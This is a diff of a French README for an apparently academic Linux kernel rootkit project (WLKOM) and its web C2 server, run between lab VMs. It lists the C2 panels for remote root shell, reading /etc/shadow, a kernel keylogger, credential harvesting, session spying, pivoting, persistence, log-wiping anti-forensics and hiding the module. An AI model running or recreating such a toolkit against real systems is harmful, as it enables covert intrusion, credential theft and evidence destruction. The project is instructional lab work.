 ### 9.2 - Démarrer le serveur C2
 
-Toujours en root dans la **VM Attaquante** :
+Toujours en root dans la **VM attacker** :
 
 **Option A** - Lancement au premier plan (voir les logs en direct) :
 
@@ -925,31 +1039,28 @@ Pour consulter les logs :
 cat /tmp/c2.log
 ```
 
-**Sortie attendue au démarrage :**
+### 9.3 - Connexion automatique du rootkit
+
+Si le rootkit est déjà chargé sur la VM victim, il se connecte **automatiquement** en moins de 5 secondes.
+
+Vous verrez dans les logs du C2 :
 
 ```
 INFO:     Started server process [XXXX]
 INFO:     Waiting for application startup.
-INFO:     Application startup complete.
-INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
 [C2] Crypto key derived (ChaCha20-Poly1305)
+INFO:     Application startup complete.
 [C2] Rootkit listener on port 9999
+INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
 [C2] Command listener on port 9998
+[C2] Rootkit connected from ('192.168.122.146', XXXXX)
 ```
 
-### 9.3 - Connexion automatique du rootkit
-
-Si le rootkit est déjà chargé sur la victime, il se connecte **automatiquement** en moins de 5 secondes.
-
-Vous verrez dans les logs :
-
-```
-[C2] Rootkit connected from ('192.168.122.18', XXXXX)
-```
+<img src="screenshots/Partie9/c2-startup-connected.png" width="800">
 
 ### 9.4 - Accéder à l'interface web
 
-L'interface web du C2 est accessible depuis n'importe quel navigateur qui peut joindre la VM Attaquante. Deux options :
+L'interface web du C2 est accessible depuis n'importe quel navigateur qui peut joindre la VM attacker. Deux options :
 
 ---
 
@@ -961,18 +1072,17 @@ Ouvrez Firefox ou Chromium sur votre machine hôte et allez à :
 http://<IP_ATTAQUANTE>:8080
 ```
 
-Par exemple : `http://192.168.122.96:8080` (remplacez par votre IP, voir section 4.5).
+Par exemple : `http://192.168.122.167:8080` (**remplacez par votre IP**, voir section 4.5).
 
 > C'est la méthode la plus confortable : vous profitez de votre écran, clavier et souris habituels.
 
-<!-- SCREENSHOT: interface C2 ouverte depuis le navigateur de l'hôte -->
-<!-- ![C2 depuis hôte](screenshots/c2-from-host.png) -->
+<img src="screenshots/Partie9/c2-login-page.png" width="800">
 
 ---
 
-**Option B — Directement sur la VM Attaquante** (si elle a une interface graphique) :
+**Option B — Directement sur la VM attacker** (si elle a une interface graphique) :
 
-Si vous avez installé un environnement de bureau (XFCE, GNOME) sur la VM Attaquante (voir section 4.3, Option B), vous pouvez ouvrir un navigateur directement dessus :
+Si vous avez installé un environnement de bureau (XFCE, GNOME) sur la VM attacker (voir section 4.3, Option B), vous pouvez ouvrir un navigateur directement dessus :
 
 1. Ouvrez la console de la VM `attacker` dans virt-manager
 2. Lancez le navigateur (Firefox est installé par défaut avec XFCE/GNOME)
@@ -984,19 +1094,15 @@ http://localhost:8080
 
 > Ici pas besoin de connaître l'IP : le C2 tourne sur la même machine, donc `localhost` suffit.
 
-<!-- SCREENSHOT: interface C2 ouverte depuis le navigateur de la VM attaquante -->
-<!-- ![C2 depuis VM](screenshots/c2-from-vm.png) -->
-
 ---
 
 > **Les deux méthodes donnent exactement la même interface.** Choisissez celle qui vous convient le mieux.
 
-<!-- SCREENSHOT: logs du C2 au démarrage + connexion rootkit -->
-<!-- ![C2 startup](screenshots/c2-startup-logs.png) -->
-
 ---
 
 ## 10 - Utilisation de l'interface web
+
+L'interface web du C2 comporte **17 panneaux** organisés en **6 catégories** dans le menu latéral. Voici le détail complet de chaque panneau et de chaque fonctionnalité.
 
 ### 10.1 - Authentification (deux niveaux)
 
@@ -1015,8 +1121,7 @@ L'interface a **deux niveaux de sécurité** :
 
 Entrez `zerotrust` et cliquez **Login**.
 
-<!-- SCREENSHOT: page de login du C2 -->
-<!-- ![Login page](screenshots/c2-login.png) -->
+![Page de login](screenshots/Partie10/login-page.png)
 
 ---
 
@@ -1028,7 +1133,7 @@ Entrez `zerotrust` et cliquez **Login**.
 | Mot de passe | Celui choisi au chargement (`wlkom2024` dans cet exemple) |
 | Affichage | Le terminal affiche `Password:` |
 
-Allez dans **Terminal** (menu à gauche), le prompt affiche :
+Après le login, la majorité des panneaux affichent **"Authentication Required"** avec un bouton **"Go to Terminal"**. Allez dans **Terminal** (menu à gauche), le prompt affiche :
 
 ```
 [*] Rootkit connected - password required
@@ -1042,54 +1147,73 @@ Tapez le mot de passe du rootkit (ex: `wlkom2024`) et appuyez Entrée.
 root@victim:/# _
 ```
 
-> Vous êtes maintenant connecté avec un **accès root complet** à la machine victime.
+> Vous êtes maintenant connecté avec un **accès root complet** à la machine victime. Tous les panneaux sont déverrouillés.
 
-<!-- SCREENSHOT: terminal après authentification réussie -->
-<!-- ![Terminal auth](screenshots/c2-terminal-auth.png) -->
+**Authentification dans le Terminal :**
+
+![Authentification rootkit](screenshots/Partie10/terminal-auth.png)
+
+**Panneaux verrouillés avant authentification (gate) :**
+
+![Panneaux verrouillés avant auth](screenshots/Partie10/auth-gate.png)
 
 ---
 
-### 10.2 - Les panneaux de l'interface
+### 10.2 - Vue d'ensemble de l'interface
 
-Voici la liste complète des panneaux accessibles depuis le menu latéral :
+L'interface se compose de :
+
+| Élément | Description |
+|:---|:---|
+| **Barre latérale (sidebar)** | Menu de navigation avec les 17 panneaux organisés en 6 catégories |
+| **Barre supérieure (topbar)** | Statut de connexion (`root@victim`), IP, uptime, recherche `Ctrl+K`, statut `RK AUTH`, bouton Logout |
+| **Zone principale** | Contenu du panneau sélectionné |
+| **Barre de statut (statusbar)** | WebSocket status, chiffrement actif (ChaCha20-Poly1305), version (v5.0), statut rootkit, nombre d'événements |
+
+**Catégories du menu latéral :**
+
+| Catégorie | Panneaux |
+|:---|:---|
+| **Operations** | Dashboard, RTR Terminal, File System |
+| **Monitoring** | Processes, Network |
+| **Intelligence** | Keylogger, Credentials, Surveillance, VM Detection |
+| **Offensive** | Port Forward |
+| **System** | Stealth Audit, Persistence, Anti-Forensics, Modules, Activity Log, Self-Destruct |
+| **Admin** | Settings |
+
+![Dashboard complet](screenshots/Partie10/dashboard.png)
 
 ---
+
+### 10.3 - Operations
 
 #### Dashboard
 
-Vue d'ensemble du système.
+Vue d'ensemble complète du système compromis.
 
-| Information | Description |
+| Section | Description |
 |:---|:---|
-| Connection status | État de la connexion avec le rootkit (connecté / déconnecté) |
-| System info | OS, noyau, hostname, uptime de la victime |
-| Metrics | CPU, RAM, disque de la victime |
+| **Connection** | Statut de connexion, hostname, IP |
+| **Stealth Score** | Score de dissimulation sous forme de jauge circulaire (ex: 8/12 checks) |
+| **Session** | Nombre d'événements, uptime |
+| **System Information** | Hostname, OS, Kernel, Architecture, CPU, Cores, IP, MAC, Gateway, RAM, Disk, Uptime |
+| **Barres RAM / Disk** | Utilisation en pourcentage avec barre de progression |
+| **Quick Actions** | Boutons rapides : Refresh All, Stealth Audit, Dump Keylog, Open Terminal |
+| **Recent Activity** | Tableau des 10 derniers événements (heure, type, message) |
 
-<!-- SCREENSHOT: dashboard avec status connecté -->
-<!-- ![Dashboard](screenshots/c2-dashboard.png) -->
+![Dashboard](screenshots/Partie10/dashboard.png)
 
 ---
 
-#### Terminal
+#### RTR Terminal
 
-Terminal interactif pour exécuter des commandes sur la victime.
+Terminal interactif chiffré pour exécuter des commandes sur la victime en temps réel.
 
-Le terminal affiche pour chaque commande :
-- **stdout** : la sortie standard de la commande
-- **stderr** : les messages d'erreur (affichés en rouge)
-- **exit status** : le code de retour (0 = succès, autre = erreur)
-
-Exemples de commandes :
-
-```bash
-whoami                    # → root                    (exit: 0)
-hostname                  # → victim                  (exit: 0)
-ls -la /etc/              # → liste des fichiers      (exit: 0)
-cat /etc/shadow           # → hashes des mots de passe(exit: 0)
-cat /fichier/inexistant   # → stderr: No such file    (exit: 1)
-ip addr                   # → interfaces réseau       (exit: 0)
-ps aux                    # → processus en cours      (exit: 0)
-```
+**Caractéristiques :**
+- Affiche **stdout**, **stderr** (en rouge) et **exit status** pour chaque commande
+- **Quick commands** : boutons cliquables pour les commandes fréquentes (`id`, `whoami`, `uname -a`, `ps aux`, `ls -la`, `ifconfig`, `netstat -tlnp`, `free -m`, `df -h`, `uptime`, `cat /etc/shadow`, `ss -tnp`)
+- Barre de titre affichant `root@victim — bash — IP`
+- Prompt interactif : `root@victim:/# _`
 
 **Commandes spéciales :**
 
@@ -1099,151 +1223,410 @@ ps aux                    # → processus en cours      (exit: 0)
 | `upload <chemin>` | Envoie un fichier vers la victime |
 | `download <chemin>` | Télécharge un fichier depuis la victime |
 | `clear` | Efface l'écran du terminal |
+| `help` | Affiche les commandes disponibles |
 
-<!-- SCREENSHOT: terminal en action avec commandes exécutées -->
-<!-- ![Terminal](screenshots/c2-terminal.png) -->
+**Exécution de commandes (id, whoami, uname, ps aux, ls) :**
+
+![Terminal commandes](screenshots/Partie10/terminal-cmds-1.png)
+
+**Exécution de commandes (cat /etc/shadow, ifconfig, etc.) :**
+
+![Terminal commandes suite](screenshots/Partie10/terminal-cmds-2.png)
 
 ---
 
 #### File System
 
-Navigateur de fichiers de la machine victime.
+Navigateur de fichiers complet de la machine victime avec arborescence et prévisualisation.
 
-| Action | Icône | Description |
+**Interface :**
+- **Panneau gauche** : arborescence des dossiers (vue arbre dépliable)
+- **Panneau droit** : contenu du dossier courant (tableau avec nom, taille, permissions, propriétaire, date)
+- **Barre de navigation** : chemin courant, boutons Back / Up / Refresh / Go
+- **Prévisualisation** : cliquer sur **View** affiche le contenu d'un fichier texte en bas du panneau
+- **Downloaded Files** : liste des fichiers téléchargés (sauvegardés dans `/tmp/wlkom_dl_*` sur l'attaquant)
+
+| Action | Bouton | Description |
 |:---|:---:|:---|
 | Naviguer | Clic sur dossier | Parcourir l'arborescence |
 | Voir un fichier | **View** | Affiche le contenu texte |
 | Télécharger fichier | **DL** | Télécharge sur votre machine |
-| Télécharger dossier | **.tar.gz** | Archive le dossier et télécharge |
-| Envoyer un fichier | **Upload** | Envoie un fichier depuis votre machine |
-| Supprimer | Poubelle (rouge) | Supprime avec confirmation |
+| Télécharger dossier | **.tar.gz** | Archive et télécharge le dossier |
+| Envoyer un fichier | **Upload** | Envoie un fichier depuis votre machine vers la victime |
+| Tout extraire | **Extract All** | Télécharge tout le dossier courant |
+| Supprimer | Poubelle rouge | Supprime le fichier ou dossier (avec confirmation) |
 
-<!-- SCREENSHOT: navigateur de fichiers -->
-<!-- ![File System](screenshots/c2-filesystem.png) -->
+![File System](screenshots/Partie10/filesystem.png)
 
 ---
 
+### 10.4 - Monitoring
+
 #### Processes
 
-Liste des processus en cours sur la victime (équivalent de `ps aux`).
+Gestionnaire de processus de la victime (équivalent graphique de `ps aux`).
 
-- Affiche : PID, utilisateur, CPU%, MEM%, commande
-- Bouton **Kill** pour terminer un processus (envoie `SIGKILL`)
+| Colonne | Description |
+|:---|:---|
+| **PID** | Identifiant du processus |
+| **User** | Propriétaire (root affiché en rouge) |
+| **CPU %** | Utilisation CPU avec barre de progression colorée (vert/jaune/rouge) |
+| **MEM %** | Utilisation mémoire avec barre de progression colorée |
+| **Stat** | État du processus (R, S, D, Z...) |
+| **Command** | Commande complète |
 
-<!-- SCREENSHOT: liste des processus -->
-<!-- ![Processes](screenshots/c2-processes.png) -->
+- **Tri** : cliquez sur les en-têtes PID, CPU ou MEM pour trier
+- **Kill** : bouton rouge pour terminer un processus (`SIGKILL`)
+- Résumé en haut : nombre total de processus, processus root, CPU% total, MEM% total
+
+![Processes](screenshots/Partie10/processes.png)
 
 ---
 
 #### Network
 
-Informations réseau de la victime : interfaces, IP, routes, connexions.
+Panneau d'analyse réseau complet avec **9 onglets** :
+
+| Onglet | Description |
+|:---|:---|
+| **Connections** | Connexions TCP/UDP actives avec état coloré (ESTABLISHED en vert, TIME_WAIT en jaune, etc.) |
+| **Listeners** | Services en écoute — les ports C2 (8080, 9999, 9998) sont surlignés en rouge |
+| **Interfaces** | Cartes réseau avec IP, MAC, MTU, type, trafic RX/TX |
+| **Routes** | Table de routage avec la passerelle par défaut mise en avant |
+| **ARP Table** | Voisins réseau (IP, MAC, état, détection QEMU/KVM par OUI) |
+| **DNS** | Serveurs DNS configurés + outil de lookup DNS intégré |
+| **Port Scan** | Scanner de ports intégré (IP + plage de ports, ou "Common Ports") |
+| **Capture** | Sniffer de paquets (`tcpdump`) : choix de l'interface, filtre BPF, nombre de paquets |
+| **Topology** | Carte réseau visuelle SVG avec les nœuds Gateway / Attacker / Victim et le canal C2 chiffré |
+
+Statistiques en haut : nombre de connexions actives, listeners, interfaces UP, entrées ARP/DNS.
+
+**Onglet Connections — connexions TCP/UDP actives :**
+
+![Network Connections](screenshots/Partie10/network-connections.png)
+
+**Onglet Listeners — services en écoute :**
+
+![Network Listeners](screenshots/Partie10/network-listeners.png)
+
+**Onglet Interfaces — cartes réseau :**
+
+![Network Interfaces](screenshots/Partie10/network-interfaces.png)
+
+**Onglet Routes — table de routage :**
+
+![Network Routes](screenshots/Partie10/network-routes.png)
+
+**Onglet ARP Table — voisins réseau :**
+
+![Network ARP](screenshots/Partie10/network-arp.png)
+
+**Onglet DNS — serveurs et lookup :**
+
+![Network DNS](screenshots/Partie10/network-dns.png)
+
+**Onglet Port Scan — scanner de ports intégré :**
+
+![Network Port Scan](screenshots/Partie10/network-portscan.png)
+
+**Onglet Capture — sniffer de paquets (tcpdump) :**
+
+![Network Capture](screenshots/Partie10/network-capture.png)
+
+**Onglet Topology — carte réseau visuelle SVG :**
+
+![Network Topology](screenshots/Partie10/network-topology.png)
 
 ---
 
-#### Downloads
-
-Liste des fichiers téléchargés depuis la victime. Vous pouvez les sauvegarder sur votre machine.
-
----
-
-#### Sniffer
-
-Capture de paquets réseau sur la victime (utilise `tcpdump`).
-
-- Démarre / arrête la capture
-- Affiche les paquets en temps réel
-
----
+### 10.5 - Intelligence
 
 #### Keylogger
 
-Capture des frappes clavier de la victime.
+Capture des frappes clavier de la victime au niveau noyau.
+
+**Deux sources de capture :**
 
 | Source | Méthode |
 |:---|:---|
-| Console physique | keyboard_notifier (noyau) |
-| Sessions SSH | Hook sys_read sur TTY/PTY |
+| Console physique / locale | `register_keyboard_notifier()` — capture au niveau input kernel |
+| Sessions SSH / PTY | Hook `__x64_sys_read()` via ftrace — filtre les majors 4 (tty) et 136 (pts) |
 
-- Le keylogger démarre automatiquement au chargement du rootkit
-- Bouton **Dump** pour récupérer le buffer
+**Boutons de contrôle :**
 
-<!-- SCREENSHOT: keylogger avec frappes capturées -->
-<!-- ![Keylogger](screenshots/c2-keylogger.png) -->
+| Bouton | Action |
+|:---|:---|
+| **Start** | Active le keylogger dans le noyau |
+| **Stop** | Désactive le keylogger |
+| **Dump** | Récupère le contenu du ring buffer (4096 octets) |
+| **Export** | Exporte les captures en fichier |
+| **Auto-dump (5s)** | Active le dump automatique toutes les 5 secondes |
+
+**4 onglets :**
+
+| Onglet | Description |
+|:---|:---|
+| **Live Feed** | Flux en temps réel des frappes avec recherche. Les lignes contenant des mots de passe sont marquées `CREDENTIAL` (rouge), les commandes privilégiées `PRIV_CMD` (jaune) |
+| **Raw Buffer** | Dumps bruts du ring buffer noyau avec taille et nombre de lignes |
+| **Credentials** | Filtre automatique des lignes contenant `password`, `sudo`, `su`, `ssh`, `token`, `secret`, `login` |
+| **Hook Info** | Documentation technique : méthode de collection, buffer circulaire, protocole, référence MITRE T1056.001 |
+
+Statistiques : nombre de captures, taille des données, credentials détectées, commandes privilégiées.
+
+**Onglet Live Feed — flux en temps réel des frappes :**
+
+![Keylogger Live Feed](screenshots/Partie10/keylogger-live.png)
+
+**Onglet Raw Buffer — dumps bruts du ring buffer noyau :**
+
+![Keylogger Raw Buffer](screenshots/Partie10/keylogger-raw.png)
+
+**Onglet Hook Info — documentation technique de la capture :**
+
+![Keylogger Hook Info](screenshots/Partie10/keylogger-hookinfo.png)
+
+---
+
+#### Credentials
+
+Extraction de secrets et reconnaissance post-exploitation.
+
+**3 onglets :**
+
+| Onglet | Description |
+|:---|:---|
+| **System Recon** | Liste de cibles classées par sévérité (critical, high, medium, low) : `/etc/shadow`, clés SSH, fichiers SUID, historiques bash, sudo config, etc. Bouton **Fetch** pour récupérer chaque fichier. Filtre par catégorie : passwords, keys, privesc, recon, persist |
+| **Deep Harvest** | Extraction automatisée en masse — lance toutes les commandes de récolte en un clic (**Harvest All**). Chaque résultat affiche le nombre de lignes extraites |
+| **Loot Summary** | Tableau récapitulatif de tout le butin : source, nom, sévérité, taille, nombre de lignes |
+
+Statistiques : items récoltés, harvest complétés, cibles critiques, vecteurs de privesc.
+
+**Onglet System Recon — cibles classées par sévérité :**
+
+![Credentials System Recon](screenshots/Partie10/credentials-recon.png)
+
+**Onglet Deep Harvest — extraction automatisée en masse :**
+
+![Credentials Deep Harvest](screenshots/Partie10/credentials-harvest.png)
+
+**Onglet Loot Summary — récapitulatif du butin :**
+
+![Credentials Loot Summary](screenshots/Partie10/credentials-loot.png)
+
+---
+
+#### Surveillance
+
+Espionnage de sessions, surveillance de fichiers et logs d'authentification.
+
+**3 onglets :**
+
+| Onglet | Description |
+|:---|:---|
+| **Session Spy** | Liste les terminaux actifs (PTY) avec utilisateur et commande en cours. Boutons pour espionner chaque session : affiche les processus et l'input capturé en temps réel |
+| **File Monitor** | Vérifie les modifications récentes sur les fichiers système sensibles (`/etc/shadow`, `authorized_keys`, `sudoers`, etc.) — détecte l'activité d'un administrateur ou d'un autre attaquant |
+| **Auth Logs** | Récupère les logs d'authentification : connexions SSH, usage de sudo, échecs d'authentification. Les échecs sont affichés en rouge, les succès en vert |
+
+**Onglet Session Spy — espionnage de terminaux actifs :**
+
+![Surveillance Session Spy](screenshots/Partie10/surveillance-spy.png)
+
+**Onglet File Monitor — surveillance des fichiers système sensibles :**
+
+![Surveillance File Monitor](screenshots/Partie10/surveillance-filemonitor.png)
+
+**Onglet Auth Logs — logs d'authentification :**
+
+![Surveillance Auth Logs](screenshots/Partie10/surveillance-authlogs.png)
+
+---
+
+#### VM Detection
+
+Détection de virtualisation, conteneurs et outils de sécurité (MITRE T1497).
+
+**Vérifications effectuées :**
+- Flag hyperviseur CPUID
+- Chaînes DMI/BIOS (QEMU, VMware, VirtualBox, Hyper-V)
+- Modules noyau de VM
+- OUI de l'adresse MAC (détection QEMU/KVM par `52:54`, Xen par `00:16:3e`)
+- Modèles de disques virtuels
+- Outils guest installés
+- Détection de conteneurs (Docker, LXC)
+- Outils de sécurité / monitoring
+
+**Résultat :**
+- Cercle vert **"Bare Metal / Clean Environment"** ou jaune **"Virtual Environment Detected"**
+- Nombre d'indicateurs détectés vs propres
+- Détail de chaque vérification avec sa sortie
+- Recommandation OPSEC si VM détectée (honeypot, sandbox, lab d'analyse)
+
+![VM Detection](screenshots/Partie10/vm-detection.png)
+
+---
+
+### 10.6 - Offensive
+
+#### Port Forward
+
+Redirection de ports TCP et pivoting réseau depuis la victime.
+
+**Création d'un tunnel :**
+
+| Paramètre | Description |
+|:---|:---|
+| **Type** | TCP Proxy (python3), Pipe (nc single), Pipe (nc loop) |
+| **Listen Port** | Port d'écoute sur la victime |
+| **Target Host** | Hôte cible (ex: `127.0.0.1`) |
+| **Target Port** | Port cible |
+
+**Presets rapides :**
+
+| Preset | Configuration |
+|:---|:---|
+| SSH | Port 22 → 4444 |
+| HTTP | Port 80 → 8081 |
+| MySQL | Port 3306 → 3307 |
+| RDP | Port 3389 → 3390 |
+
+Tableau des tunnels actifs avec PID, statut et bouton de suppression.
+
+![Port Forward](screenshots/Partie10/port-forward.png)
+
+---
+
+### 10.7 - System
+
+#### Stealth Audit
+
+Audit complet de la dissimulation du rootkit avec note de **A** à **F**.
+
+**Catégories de vérification :**
+
+| Catégorie | Vérifie |
+|:---|:---|
+| **Concealment** | Module caché de lsmod, /proc/modules, /sys/module, fichiers cachés, logs filtrés, connexion cachée, PID caché |
+| **Persistence** | Mécanismes de survie au redémarrage |
+| **Offensive** | Capacités offensives actives |
+| **Crypto & Auth** | Chiffrement et authentification fonctionnels |
+| **Ftrace Hooks** | Hooks syscall actifs (getdents64, read, recvmsg) |
+
+- **Run All Checks** : lance tous les tests automatiquement
+- Chaque vérification affiche **PASS** (vert) ou **FAIL** (rouge) avec la sortie détaillée
+- Barre de progression avec pourcentage de dissimulation
+- Note globale : A (≥90%), B (≥75%), C (≥55%), D (≥35%), F (<35%)
+
+![Stealth Audit](screenshots/Partie10/stealth-audit.png)
+
+---
+
+#### Persistence
+
+Gestion des mécanismes de persistance au redémarrage.
+
+Pour chaque mécanisme :
+
+| Information | Description |
+|:---|:---|
+| **Statut** | ACTIVE (vert) ou OFF (gris) |
+| **Nom** | Nom du mécanisme (ex: modules-load.d, modprobe.d, crontab, etc.) |
+| **Risque de détection** | LOW / MEDIUM / HIGH |
+| **Description** | Explication du fonctionnement |
+| **Détail technique** | Chemin du fichier ou commande utilisée |
+
+- Boutons **Enable** / **Disable** pour activer/désactiver chaque mécanisme
+- Bouton **Check All Status** pour vérifier l'état de tous les mécanismes
+
+![Persistence](screenshots/Partie10/persistence.png)
+
+---
+
+#### Anti-Forensics
+
+Destruction de preuves et nettoyage d'artefacts.
+
+Les actions sont organisées par catégorie et classées par sévérité (critical, high, medium).
+
+| Exemple d'action | Description |
+|:---|:---|
+| Effacer les logs système | Vide `/var/log/syslog`, `/var/log/auth.log`, etc. |
+| Effacer l'historique bash | Supprime `.bash_history` de tous les utilisateurs |
+| Nettoyer les fichiers temporaires | Supprime les fichiers dans `/tmp` |
+| Effacer les logs du journal | Vide le journal `journalctl` |
+
+- **Execute All** : lance toutes les actions de nettoyage en un clic
+- Chaque action affiche la commande exécutée et le résultat
+
+![Anti-Forensics](screenshots/Partie10/anti-forensics.png)
 
 ---
 
 #### Modules
 
-Liste des modules noyau chargés sur la victime (équivalent de `lsmod`).
+Liste des modules internes du rootkit (composants noyau).
 
-> `wlkom` n'apparaît PAS dans cette liste (il est caché).
+- Organisés par catégorie
+- Chaque module affiche : statut (ACTIVE/OFF), nom, description, hook/fonction
+- Note : tous les modules sont compilés dans le LKM et activés au chargement — ils ne peuvent pas être activés/désactivés individuellement
 
----
+> `wlkom` n'apparaît PAS dans la commande `lsmod` de la victime (il est caché).
 
-#### Stealth
-
-Tableau de bord des capacités de dissimulation du rootkit.
-
-Affiche l'état de chaque mécanisme :
-- Module caché de lsmod
-- Module caché de /proc/modules et /sys/module
-- Fichiers cachés de ls
-- Logs noyau filtrés
-- Connexion cachée de ss/netstat
-- PID du kthread caché
-
-<!-- SCREENSHOT: panneau stealth avec tous les statuts -->
-<!-- ![Stealth](screenshots/c2-stealth.png) -->
+![Modules](screenshots/Partie10/modules.png)
 
 ---
 
-#### Syscalls
+#### Activity Log
 
-Visualisation des hooks syscall actifs.
+Journal complet de toutes les actions effectuées pendant la session.
 
-| Hook | Syscall | Rôle |
-|:---|:---|:---|
-| hk_getdents64 | `__x64_sys_getdents64` | Cache fichiers/PIDs |
-| hk_read | `__x64_sys_read` | Filtre logs + capture TTY |
-| hk_recvmsg | `__x64_sys_recvmsg` | Cache connexion de ss |
-
----
-
-#### MITRE ATT&CK
-
-Mapping des techniques MITRE ATT&CK utilisées par le rootkit :
-- Initial Access, Exécution, Persistence, Defense Evasion, Collection, Command & Control
-
----
-
-#### Deploy
-
-| Action | Description |
+| Fonctionnalité | Description |
 |:---|:---|
-| **Compile** | Compile le rootkit à distance sur la victime |
-| **Load** | Charge le module (insmod) |
-| **Uninstall** | Décharge le module + supprime la persistance + nettoie |
+| **Filtres** | Par type : all, info, cmd, rootkit, warn, error, success |
+| **Recherche** | Barre de recherche textuelle |
+| **Export JSON** | Exporte tout le journal au format JSON |
+| **Clear** | Vide le journal |
 
-<!-- SCREENSHOT: panneau deploy -->
-<!-- ![Deploy](screenshots/c2-deploy.png) -->
+Tableau avec colonnes : heure, type (badge coloré), message.
+
+![Activity Log](screenshots/Partie10/activity-log.png)
+
+---
+
+#### Self-Destruct
+
+Suppression complète du rootkit et de toutes ses traces sur la victime.
+
+**Processus en 2 étapes :**
+
+1. Cliquez sur **ARM Self-Destruct** — le bouton passe en mode "armé"
+2. Cliquez sur **CONFIRM SELF-DESTRUCT** pour exécuter
+
+**Actions effectuées :**
+- Déchargement du module noyau
+- Suppression de la persistance
+- Effacement des logs
+- Destruction des fichiers temporaires
+- Suppression du binaire du rootkit
+
+> Cette action est **irréversible**. Un bouton **Cancel** permet d'annuler avant la confirmation.
+
+![Self-Destruct](screenshots/Partie10/self-destruct.png)
 
 ---
 
-#### Activity
-
-Journal de toutes les actions effectuées. Export en JSON disponible.
-
----
+### 10.8 - Admin
 
 #### Settings
 
-| Paramètre | Description |
+Administration du serveur C2.
+
+| Section | Description |
 |:---|:---|
-| **Restart C2** | Redémarre le serveur C2 |
-| **Reconnect rootkit** | Force la reconnexion |
-| **Change password** | Modifie le mot de passe de la plateforme web |
-| **Session info** | Durée de session, token actif |
+| **Server Control** | Boutons **Reconnect Rootkit** (force la reconnexion) et **Restart C2 Server** (redémarre le serveur) |
+| **Change Platform Password** | Formulaire : mot de passe actuel, nouveau mot de passe, confirmation |
+| **Session Info** | Statut de connexion, WebSocket, chiffrement actif, durée de session, token |
+
+![Settings](screenshots/Partie10/settings.png)
 
 ---
 
@@ -1370,8 +1753,8 @@ Le C2 est un serveur web écrit en **Python 3** :
 
 | Composant | Rôle | Version |
 |:---|:---|:---|
-| FastAPI | Framework web asynchrone | 0.136.1 |
-| Uvicorn | Serveur ASGI | 0.47.0 |
+| FastAPI | Framework web asynchrone | 0.138.0 |
+| Uvicorn | Serveur ASGI | 0.49.0 |
 | WebSocket | Communication temps réel navigateur | 16.0 |
 | Cryptography | Dérivation de clé + chiffrement | 38.0.4 |
 
@@ -1389,17 +1772,19 @@ Le C2 est un serveur web écrit en **Python 3** :
 
 | Endpoint | Méthode | Auth | Description |
 |:---|:---:|:---:|:---|
-| `/` | GET | Non | Page web complète du C2 |
-| `/api/login` | POST | Non | Authentification (retourne un token) |
+| `/` | GET | Non | Page web complète du C2 (HTML + CSS + JS embarqués) |
+| `/api/login` | POST | Non | Authentification (retourne un token de session) |
 | `/api/logout` | POST | Oui | Déconnexion (supprime le token) |
-| `/api/status` | GET | Non | État du C2 et du rootkit |
+| `/api/status` | GET | Non | État du C2, du rootkit et informations système |
 | `/api/exec` | POST | Oui | Exécuter une commande sur la victime |
 | `/api/upload` | POST | Oui | Upload fichier vers la victime |
+| `/api/downloads` | GET | Non | Lister les fichiers téléchargés depuis la victime |
 | `/api/dl/<fichier>` | GET | Non | Télécharger un fichier depuis le C2 |
+| `/api/dl/<fichier>` | DELETE | Oui | Supprimer un fichier téléchargé |
 | `/api/reconnect-rk` | POST | Oui | Forcer la reconnexion du rootkit |
 | `/api/restart-c2` | POST | Oui | Redémarrer le serveur C2 |
-| `/api/change-password` | POST | Oui | Changer le mot de passe plateforme |
-| `/ws` | WebSocket | Non | Flux temps réel (logs, output, events) |
+| `/api/change-password` | POST | Oui | Changer le mot de passe de la plateforme |
+| `/ws` | WebSocket | Non | Flux temps réel (logs, output, événements) |
 
 ---
 
@@ -1561,7 +1946,7 @@ Chaque message envoyé sur le réseau a ce format :
 |:---|:---|:---|
 | C2 lancé ? | `ss -tlnp \| grep 9999` (sur attaquant) | Ligne avec LISTEN |
 | Réseau OK ? | `ping -c 1 <IP_ATTAQUANTE>` (depuis victime) | 0% packet loss |
-| Bonne IP ? | Vérifier le `c2_ip` passé à `insmod` | IP de l'attaquante |
+| Bonne IP ? | Vérifier le `c2_ip` passé à `insmod` | IP de l'attacker |
 | Logs C2 | `cat /tmp/c2.log` (sur attaquant) | Messages d'erreur ? |
 
 ### L'interface web ne se charge pas
@@ -1625,35 +2010,33 @@ wlkom/
 │
 ├── rootkit/
 │   ├── wlkom.c                      Code source du rootkit (1166 lignes C)
-│   ├── wlkom_commented.c            Version commentée (explications détaillées + glossaire)
 │   ├── Makefile                     Compilation du module noyau
 │   ├── ssh_victim.sh                Raccourci SSH vers la victime
 │   └── ssh_attacker.sh              Raccourci SSH vers l'attaquant
 │
 └── attacking_program/
-    ├── c2.py                        Serveur C2 complet (~3500 lignes Python)
-    │                                HTML + CSS + JS embarqués
-    └── c2_commented.py              Version commentée du backend (+ glossaire)
+    └── c2.py                        Serveur C2 complet (~3500 lignes Python)
+                                     HTML + CSS + JS embarqués
 ```
 
 ### Dépendances complètes
 
-**VM Victime** (compilation + exécution du rootkit) :
+**VM victim** (compilation + exécution du rootkit) :
 
 | Paquet | Version | Installation |
 |:---|:---|:---|
 | build-essential | 12.9 | `apt install build-essential` |
-| linux-headers | 6.1.0-44 | `apt install linux-headers-$(uname -r)` |
+| linux-headers | 6.1.0-49 | `apt install linux-headers-$(uname -r)` |
 | gcc | 12.2.0 | (inclus dans build-essential) |
 | make | 4.3 | (inclus dans build-essential) |
 
-**VM Attaquante** (serveur C2) :
+**VM attacker** (serveur C2) :
 
 | Paquet | Version | Installation |
 |:---|:---|:---|
 | python3 | 3.11.2 | `apt install python3 python3-venv` |
-| fastapi | 0.136.1 | `pip install fastapi` |
-| uvicorn | 0.47.0 | `pip install uvicorn[standard]` |
+| fastapi | 0.138.0 | `pip install fastapi` |
+| uvicorn | 0.49.0 | `pip install uvicorn[standard]` |
 | websockets | 16.0 | `pip install websockets` |
 | cryptography | 38.0.4 | `pip install cryptography` |
 
@@ -1662,5 +2045,5 @@ wlkom/
 <p align="center">
   <b>WLKOM</b> — Wild Linux Kernel Object Module<br>
   Projet EPITA SYS2 — APPING1<br>
-  <i>yazid.tarmoul</i>
+  <i>yazid.tarmoul · rayan.kheroua · arsan.abdi</i>
 </p>
